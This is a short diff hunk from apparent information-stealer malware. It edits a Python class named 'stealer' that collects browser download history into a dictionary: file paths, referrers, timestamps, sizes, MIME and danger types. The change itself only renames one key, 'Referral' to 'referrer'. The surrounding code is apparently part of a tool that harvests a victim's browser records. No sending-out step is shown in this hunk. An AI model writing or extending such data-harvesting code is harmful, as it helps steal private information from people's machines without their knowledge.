@@ -149,7 +149,7 @@ class stealer:
             # print(f"[+]  - Current Path: {currentPath}, Target Path: {targetPath}, Referrer: {referrer}, Start Time: {startTime}, End Time: {endTime}, Total Bytes: {totalBytes}, Last Access Time: {lastAccessTime}, MIME Type: {mimeType}, State: {state}, Danger Type: {dangerType}, Interrupt Reason: {interruptReason}")
             DownloadHistory[currentPath] = {
                 "targetPath": targetPath,
-                "Referral": referrer,
+                "referrer": referrer,
                 "startTime": startTime,
                 "endTime": endTime,
                 "totalBytes": totalBytes,
